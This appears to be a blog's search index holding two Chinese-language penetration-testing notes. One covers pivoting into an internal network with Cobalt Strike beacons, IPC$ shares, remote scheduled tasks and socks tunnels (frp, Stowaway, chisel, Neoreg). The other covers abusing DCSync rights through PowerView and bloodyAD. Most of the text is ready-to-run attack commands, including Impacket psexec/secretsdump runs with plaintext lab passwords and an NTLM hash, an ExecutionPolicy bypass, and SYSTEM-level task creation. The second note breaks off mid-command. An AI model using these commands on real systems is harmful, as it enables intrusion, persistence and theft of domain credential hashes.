<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/08/10/socks%E4%BB%A3%E7%90%86/%E8%BF%9C%E7%A8%8B/"/>
      <url>/2024/08/10/socks%E4%BB%A3%E7%90%86/%E8%BF%9C%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>远程主要有三种方式：即VPN、Socks和挂马</p><p>1）VPN即和本地操作差不多，啥操作都是直接往脸上怼<br>2）socks代理即通过搭建的代理隧道使得外网的自己能与内网主机交互数据<br>3）挂马，提权后也和直接在本机上操作差不多，不过全是以命令行的形式完成数据交互</p><h1 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h1><p>有账号密码直接连接即可，相当于本地操作</p><h1 id="挂马"><a href="#挂马" class="headerlink" title="挂马"></a>挂马</h1><p>挂马工具集成化工具主要是CS和MSF</p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>MSF实际用到很少，而且也是平常学习常用到的，这里使用参考<br><a href="https://blog.51cto.com/lyshark/5322404">https://blog.51cto.com/lyshark/5322404</a></p><h2 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h2><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a><strong>网络拓扑</strong></h3><p>![[Pasted image 20230803135438.png]]<br>Web服务器已经拿下<br>![[Pasted image 20230803135454.png]]</p><h3 id="配置socks-代理"><a href="#配置socks-代理" class="headerlink" title="配置socks 代理"></a><strong>配置socks 代理</strong></h3><p>设置代理端口<br>![[Pasted image 20230803135503.png]]<br>修改proxychains配置文件<br>![[Pasted image 20230803135510.png]]<br>查看能否与域内主机互通，检验配置是否存在问题（顺便看看其3389远程桌面开没）</p><p>proxychains nmap -Pn -sT -p3389 192.168.20.136<br>![[Pasted image 20230803135516.png]]</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h3><p>新建监听窗口<br>![[Pasted image 20230803135522.png]]<br>生成可执行payload<br>![[Pasted image 20230803135532.png]]<br>上传payload并执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell cd 目标文件路径</span><br><span class="line">upload 要上传的文件路径</span><br></pre></td></tr></table></figure><p>利用web服务器的会话以及域内主机的账号密码进行IPC$横向</p><p>建立IPC$会话：</p><p>Shell net use <a href="%5C192.168.20.136%5Cipc$">\192.168.20.136\ipc$</a> &#x2F;user :guan1 “Guan207566903”<br>![[Pasted image 20230803135545.png]]<br>查看会话建立与否：</p><p>Shell net use<br>![[Pasted image 20230803135553.png]]<br>利用IPC$命名管道上传之前生成的payload:</p><p>Shell copy beacon.exe \192.168.20.136\c$<br>![[Pasted image 20230803135559.png]]<br>制定计划任务到点执行我们的payload：</p><p>shell schtasks &#x2F;create &#x2F;tn “beacon” &#x2F;tr c:\beacon.exe &#x2F;sc once &#x2F;st 22:20 &#x2F;S 192.168.20.136 &#x2F;RU System &#x2F;u guan1 &#x2F;p “Guan207566903”<br>![[Pasted image 20230803135608.png]]<br>在web服务器的会话上监听反弹会话</p><p>Connect 192.168.20.136 4433<br>![[Pasted image 20230803135615.png]]<br>成功上线：<br>![[Pasted image 20230803135621.png]]</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a><strong>反向连接</strong></h3><p>代理转发 -&gt; 转发上线 -&gt; 设置监听地址为内网ip地址，重新以该监听器生成payload，直接上传到要穿透的目标，或者在跳板机搭建文件共享，并上传payload，远程控制目标执行命令运行该payload(可能会有弹窗)<br>![[Pasted image 20230803135627.png]]<br>生成后门同样利用IPC$共享上传，并制定计划任务书执行</p><p>最终结果如下<br>![[Pasted image 20230803135632.png]]</p><h1 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h1><h2 id="网络拓补图"><a href="#网络拓补图" class="headerlink" title="网络拓补图"></a>网络拓补图</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688548965457-db47ba20-cff1-4735-944b-be4fb7081795.png"></p><h2 id="Frp代理"><a href="#Frp代理" class="headerlink" title="Frp代理"></a>Frp代理</h2><h3 id="在vps-上搭建frp服务端"><a href="#在vps-上搭建frp服务端" class="headerlink" title="在vps 上搭建frp服务端"></a>在vps 上搭建frp服务端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bind_qddr =  0.0.0.0</span><br><span class="line">Bind_port = 7000</span><br><span class="line">启动frps服务：</span><br><span class="line">./frp.exe -c ./frps.ini</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688549057958-63ab2067-6f4c-46ce-9f6a-6bb833eb14bc.png"></p><h3 id="在web服务器上搭建frp客户端"><a href="#在web服务器上搭建frp客户端" class="headerlink" title="在web服务器上搭建frp客户端"></a>在web服务器上搭建frp客户端</h3><p>假设已经拿下域内的webserver</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688970784892-34473c13-0a2b-48ab-a9c8-1f87e783faa2.png"></p><p>通过会话上传配置好的fprc.ini和frpc.exe</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688971247770-03b0bc2e-f442-4fbd-9afc-84736f7f50f0.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.202.166 </span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin =socks5</span><br><span class="line">启动客户端：</span><br><span class="line">.\frpc.exe -c .\frpc.ini</span><br></pre></td></tr></table></figure><p>运行fprc</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688550764242-33c3a250-e992-496e-af4d-bfed7923a3c6.png"></p><h2 id="Stowaway代理"><a href="#Stowaway代理" class="headerlink" title="Stowaway代理"></a>Stowaway代理</h2><p>打开服务端监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 192.168.202.199:2222 -s 123</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688656206205-01ca2d4a-392f-459a-b3e9-ae6f5f13297a.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688656223521-70aa474e-0201-45bb-8e7a-aa59b2bd66f9.png"></p><p>上传客户端并执行</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688974691535-ec78fae3-4731-4ba2-99b3-42a28ba6db0e.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows_x64_agent.exe -c 192.168.202.199:2222 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688974666874-4763af64-bfdc-4634-aab3-b82daa6aaddb.png"></p><p>建立socks5代理</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688974871120-776e0c98-c99d-40ee-a1ca-e2c08202ed48.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Admin 端监听，等待 startnode 连接：./stowaway admin -l 9999 -s 123</span><br><span class="line">命令解析：</span><br><span class="line">dmin 代表以 admin 模式启动</span><br><span class="line"></span><br><span class="line">-l 参数代表监听端口 </span><br><span class="line">-s 参数代表节点通信加密密钥 (admin 端与 agent 端必须一致！)</span><br><span class="line"></span><br><span class="line">startnode 端：./stowaway agent -m 127.0.0.1:9999 -l 10000 –startnode -s 123 –reconnect 5</span><br><span class="line">命令解析：</span><br><span class="line"></span><br><span class="line">agent 代表以 agent 端模式启动</span><br><span class="line">-m 代表上一级节点的地址</span><br><span class="line">-l 代表监听端口</span><br><span class="line">-s 参数代表节点通信加密密钥 (admin 端与 agent 端必须一致！)</span><br><span class="line">–startnode 代表此节点是 agent 端的第一个节点（第一个节点必须加上–startnode 选项！若无–startnode 表示为普通节点，命令与 startnode 一致）</span><br><span class="line">–reconnect 代表 startnode 将在 admin 下线后主动尝试不断重连（此例子中为每 5 秒重连一次）注意：若需要重连功能，只需要在 startnode 使用此参数即可，其后节点无需此参数，正常启动即可</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="chisel代理"><a href="#chisel代理" class="headerlink" title="chisel代理"></a>chisel代理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务端</span><br><span class="line">chisel.exe server -p 8888 -reverse</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">chisel.exe client 192.168.202.1:8888 R:1080:socks</span><br><span class="line">chisel.exe client &lt;listen ip&gt;:&lt;port&gt; R:&lt;listen ip&gt;:&lt;port&gt;:socks</span><br><span class="line"></span><br><span class="line">listen ip默认是127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689515416095-1fc995e8-5fe4-4818-b20f-1c2b84877aba.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689515394974-d76417b7-4004-4186-ab83-18dbfe1da531.png"></p><h2 id="Neoreg代理-web"><a href="#Neoreg代理-web" class="headerlink" title="Neoreg代理(web)"></a>Neoreg代理(web)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">生成网马代理：</span><br><span class="line">python neoreg.py generate -k 123</span><br><span class="line"></span><br><span class="line">建立代理</span><br><span class="line">python3 neoreg.py -k 123 -u https://192.168.202.205/aspnet_client/unnel.aspx</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689212000212-6c469025-2aa8-4847-8192-2e44139f75ce.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689212104978-4891f6cc-6e09-47b4-a8fb-23c735fbf659.png"></p><h2 id="Chunk-Proxy代理（web）"><a href="#Chunk-Proxy代理（web）" class="headerlink" title="Chunk-Proxy代理（web）"></a>Chunk-Proxy代理（web）</h2><p>java环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar chunk-Proxy.jar java 1088 http://10.10.10.1:8080/proxy.jsp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689320117030-5b990be5-b276-4bd3-84f6-c7809c416cf4.png"></p><h2 id="proxychains配置（linux）"><a href="#proxychains配置（linux）" class="headerlink" title="proxychains配置（linux）"></a>proxychains配置（linux）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim  /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688657160823-1a9d917c-c676-437b-ab88-9fa88f1bc39e.png"></p><p>若要解析到内网IP，则需要将默认代理DNS设置为域控IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/proxychains3/proxyresolv</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688657312605-74005914-f44a-4a54-bb2f-93564935bb62.png"></p><h2 id="proxifier配置使用（windows）"><a href="#proxifier配置使用（windows）" class="headerlink" title="proxifier配置使用（windows）"></a>proxifier配置使用（windows）</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>搭建stowaway隧道</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688698017596-d50bd51d-a554-4527-a448-d4ee81d150b6.png"></p><p>设置代理服务器</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688698117761-ea6208dc-614b-4cf7-8e17-417e094db706.png"></p><p>设置代理规则，设定目标ip为内网网段</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688698148624-9497bd22-0101-4ff5-9911-6ad98d53c95e.png"></p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>设置代理前：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688698256142-a7356bc8-cb88-43d2-81ec-a01b25202c7b.png"></p><p>设置代理后可正常远程桌面：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688697965130-947e7ef2-cbf6-4619-a3db-6245f30291a9.png"></p><h3 id="设置proxifier可以支持smb服务"><a href="#设置proxifier可以支持smb服务" class="headerlink" title="设置proxifier可以支持smb服务"></a>设置proxifier可以支持smb服务</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688698637248-0960661d-3fae-4269-b59d-1b7c7be5a457.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688698610595-c2bbd9ef-f789-411f-a28a-2733a402bab7.png"></p><p>设置前后的差别：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688698508146-9e1bf09f-31ee-4793-8009-3edd34cb5e2a.png"></p><h2 id="socks5代理利用"><a href="#socks5代理利用" class="headerlink" title="socks5代理利用"></a>socks5代理利用</h2><h3 id="psexec-py"><a href="#psexec-py" class="headerlink" title="psexec.py"></a>psexec.py</h3><p>原理：</p><p>PSEXEC的原理是通过Windows的网络服务（RPC）实现的，它会在远程机器上创建一个服务，然后在本地机器上创建一个管道，将本地机器上的命令发送到远程机器上的服务，服务接收到命令后，会将命令的结果发送回来，本地机器接收到结果后，会将结果显示出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 python3 psexec.py GUAN/guan1:Hack@159753@10.10.10.136</span><br><span class="line"></span><br><span class="line">proxychains3 python3 psexec.py -hashes :83404b3d903ef7ac48e36fa3b3b48961 GUAN/guan1@10.10.10.136</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688657700844-cb91bc9b-6693-45ad-9352-6edeff6b4a9c.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688954624585-b3fd676e-915f-414a-abe0-9b1244b48130.png"></p><h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p>原理：</p><p>通过wmi执行命令，并将执行结果保存到文件，通过smb文件共享来读取返回结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 python3 wmiexec.py GUAN/guan1:Hack@159753@10.10.10.136</span><br><span class="line"></span><br><span class="line">proxychains python wmiexec.py -hashes :83404b3d903ef7ac48e36fa3b3b48961 GUAN/guan1@10.10.10.136</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688657842780-19340e62-953f-4f10-a63d-8c6002eb6bc6.png"></p><h3 id="smbexec-py"><a href="#smbexec-py" class="headerlink" title="smbexec.py"></a>smbexec.py</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 python3 smbexec.py GUAN/guan1:Hack@159753@10.10.10.136</span><br><span class="line"></span><br><span class="line">proxychains python smbexec.py -hashes :83404b3d903ef7ac48e36fa3b3b48961 GUAN/guan1@10.10.10.136</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688975095521-e3292abd-7391-44c7-8815-0102226f1331.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688974974740-48be362f-4452-42ea-aff2-b98a6e0cd43c.png"></p><h3 id="secretsdump-py"><a href="#secretsdump-py" class="headerlink" title="secretsdump.py"></a>secretsdump.py</h3><p>原理：</p><p>使用计算机帐户密码或hash通过smbexec或者wmiexec远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的hash，同时通过Dcsync或从NTDS.dit文件中导出所有域用户的hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 python3 secretsdump.py GUAN/guan1:Hack@159753@10.10.10.136</span><br><span class="line"></span><br><span class="line">proxychains3 python3 secretsdump.py -hashes :83404b3d903ef7ac48e36fa3b3b48961 GUAN/guan1@10.10.10.136</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688657948450-8072255b-52df-4778-801b-439a951b0026.png"></p><h3 id="atexec-py"><a href="#atexec-py" class="headerlink" title="atexec.py"></a>atexec.py</h3><p>以计划任务的形式执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 python3 atexec.py guan/webserver:Guan207566903@10.10.10.135 &quot;C:\Users\webserver\Desktop\beacon.exe&quot;</span><br><span class="line"></span><br><span class="line">atexec.py [[domain/] username [: password] @] [Target IP Address][Command]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689084138864-cc1a7326-9ce5-48ba-9e5d-30a9c8ed0ec5.png"></p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>在socks代理下（若拿下的双网卡的边界主机可以直接联系也可）</p><p>先建立ipc$连接</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689085526663-8676949f-876f-4575-943a-e39d85cdaeba.png"></p><p>创建计划</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689089015903-99083feb-38c2-40aa-a4be-6d20f2c5517f.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">创建：</span><br><span class="line">schtasks /Create /S 192.168.202.188 /TN HackGuan /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c &#x27;C:\cmd.bat&#x27;&quot; /RU System /u guan\webserver /p &quot;Guan207566903&quot;  /f</span><br><span class="line">执行：</span><br><span class="line">schtasks /RUN /S 192.168.202.188 /TN HacGuan /u guan\webserver /p &quot;Guan207566903&quot;</span><br><span class="line"></span><br><span class="line">删除：</span><br><span class="line">schtasks /F /delete /tn &quot;HacGuan&quot; /S 192.168.202.188 /u guan\webserver /p &quot;Guan207566903&quot;</span><br><span class="line">参数解析：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/Create：创建新的计划任务。</span><br><span class="line">/S &lt;IP&gt; 指定要连接的系统</span><br><span class="line">/TN &lt;任务名称&gt;：指定任务的名称。</span><br><span class="line">/SC &lt;调度方案&gt;：指定任务运行的调度方案，例如MINUTE、HOURLY、DAILY等。</span><br><span class="line">/MO &lt;num&gt; 指定要运行的周期</span><br><span class="line">/TR &lt;命令&gt;：指定任务要执行的命令或程序路径。</span><br><span class="line">/RU &lt;运行用户&gt;：指定任务运行权限。</span><br><span class="line">/u 指定用户</span><br><span class="line">/p 指定用户密码</span><br><span class="line">/F：强制创建或删除</span><br><span class="line"></span><br><span class="line">/ST &lt;开始时间&gt;：指定任务的起始时间。</span><br><span class="line">/RP &lt;密码&gt;：指定运行用户的密码。</span><br><span class="line">/Query：查询和列出计划任务。</span><br><span class="line">/XML：以XML格式显示查询结果。</span><br><span class="line">/Delete：删除计划任务。</span><br></pre></td></tr></table></figure><h2 id="DNS代理解析"><a href="#DNS代理解析" class="headerlink" title="DNS代理解析"></a>DNS代理解析</h2><p>同网段域内外主机的一个重要区别为dns 解析</p><p>当需要从机器名获取到对应ip时，需要从其机器名进行dns解析</p><p>需设置proxychains相关项（dns代理设置为域控）</p><p>ping</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688658169125-b651c33e-9c92-4d05-9f51-affebbf9167d.png"></p><p>wget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-O, --output-document=文件名：将下载的文件重命名为指定的文件名。</span><br><span class="line">-P, --directory-prefix=目录：指定保存下载文件的目录路径。</span><br><span class="line">-c, --continue：继续未完成的下载任务。</span><br><span class="line">-q, --quiet：静默模式，不显示下载过程。</span><br><span class="line">--no-check-certificate：忽略 SSL 证书检查。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688658198201-d42f6afb-cd63-4c44-8458-08f467627b69.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/10/dcsync%E5%88%A9%E7%94%A8/"/>
      <url>/2024/08/10/dcsync%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>title: my blog</p><h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求。</p><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><p>获得以下任一用户的权限：</p><ul><li>Domain Admins组内的用户</li><li>Administrators组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>默认只有域控主机账号和域管理员能进行Dcsync，其机器账号拥有WriteACL的权限，可以给指定用户添加Dcsync来dump域哈希。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">复制目录更改（DS-Replication-Get-Changes）</span><br><span class="line"></span><br><span class="line">全部复制目录更改 (DS-Replication-Get-Changes-All )</span><br></pre></td></tr></table></figure><h1 id="查寻存在DCSync权限的账户"><a href="#查寻存在DCSync权限的账户" class="headerlink" title="查寻存在DCSync权限的账户"></a>查寻存在DCSync权限的账户</h1><h2 id="域控查看"><a href="#域控查看" class="headerlink" title="域控查看"></a>域控查看</h2><p>上帝视角先了解一下这几个权限的位置，打开AD管理中心，又键域名，属性</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688542032410-c6edd7c5-a710-4840-b97c-d0e1c9d030ac.png"></p><h2 id="adfind"><a href="#adfind" class="headerlink" title="adfind"></a>adfind</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC=guan,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes&quot;;; -recmute</span><br><span class="line"></span><br><span class="line">AdFind.exe -s subtree -b &quot;DC=guan,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes All&quot;;; -recmute</span><br></pre></td></tr></table></figure><p> <img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688539957867-9defb97a-e336-41fa-a350-c86a673570cc.png"></p><h1 id="给特定用户赋予DCSync权限"><a href="#给特定用户赋予DCSync权限" class="headerlink" title="给特定用户赋予DCSync权限"></a>给特定用户赋予DCSync权限</h1><h2 id="powerview-ps1"><a href="#powerview-ps1" class="headerlink" title="powerview.ps1"></a>powerview.ps1</h2><p>使用hash传递跳出的新cmd弹窗，或在我们控制的域机器上登录拥有赋予dcsync权限（域管，或域管机器用户）用户，执行以下命令达到远程赋予dcsync的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">更改默认策略，使得脚本可以执行：</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">或</span><br><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line"></span><br><span class="line">导入脚本：</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">将指定用户写入DCSync：</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=guan,DC=com&quot; -PrincipalIdentity guan1 -Rights DCSync -Verbose</span><br><span class="line">cmd下写入：</span><br><span class="line">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \&quot;DC=test,DC=com\&quot; -PrincipalIdentity haha -Rights DCSync -Verbose&#125;&quot;</span><br><span class="line"></span><br><span class="line">删除指定用户的DCSync:</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC=guan,DC=com&quot; -PrincipalIdentity guan1 -Rights DCSync -Verbose</span><br><span class="line">cmd下删除：</span><br><span class="line">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \&quot;DC=test,DC=com\&quot; -PrincipalIdentity test -Rights DCSync -Verbose&#125;&quot;</span><br><span class="line"></span><br><span class="line">查询具有DCSync权限的用户：</span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;DS-Replication-Get-Changes&quot;&#125;</span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;Replicating Directory Changes&quot;&#125; </span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;DS-Replication-Get-Changes-All&quot;&#125;</span><br><span class="line"></span><br><span class="line">查询用户的ACL:</span><br><span class="line">Get-DomainObjectAcl -Identity guan1 -domain guan.com -ResolveGUIDs</span><br></pre></td></tr></table></figure><p>赋予过程：</p><p>用域管远程登录控制的域机器：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982125103-46943000-65de-45ab-a253-4e982f151eec.png"></p><p>为域用户guan1赋予dcsync权限</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982179615-ce32079e-4f8c-4b06-b91b-8b523a775e8e.png"></p><p>查询结果：</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982333198-11733d5d-99c4-45a6-92d1-22bec309254e.png"></p><p>查看用户guan1的访问控制列表</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982453962-9d6a906c-0164-44c4-b5d9-35648f762d5e.png"></p><h2 id="bloodyAD-py"><a href="#bloodyAD-py" class="headerlink" title="bloodyAD.py"></a>bloodyAD.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看帮助文档</span><br><span class="line">python3 bloodyAD.py -h</span><br><span class="line">python3 bloodyAD.py add -h</span><br><span class="line">python3 bloodyAD.py add dcsync -h</span><br><span class="line"></span><br><span class="line">知道账户密码：</span><br><span class="line">proxychains3 python3 